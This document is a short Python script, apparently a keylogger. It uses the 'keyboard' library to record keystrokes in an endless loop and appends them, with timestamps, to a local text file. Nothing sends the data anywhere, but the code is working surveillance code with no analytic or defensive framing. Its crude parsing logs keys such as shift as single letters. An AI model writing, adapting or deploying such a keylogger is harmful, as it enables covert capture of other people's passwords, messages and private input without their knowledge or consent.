import keyboard
import datetime
while True:
    keyfile=open('keysfile.txt','a')
    keyfile.write(str(datetime.datetime.now()))
    keyfile.write('\n')
    keys=keyboard.record('enter')
    for key in keys:
        if(keys.index(key)%2==0):
            if(str(key)[14:19]=='space'):
                keyfile.write(' ')
            elif(str(key)[14:19]=='enter'):
                keyfile.write('\n')
            else:
                keyfile.write(str(key)[14])
    keyfile.write('\n')
    keys.clear()
    keyfile.close()

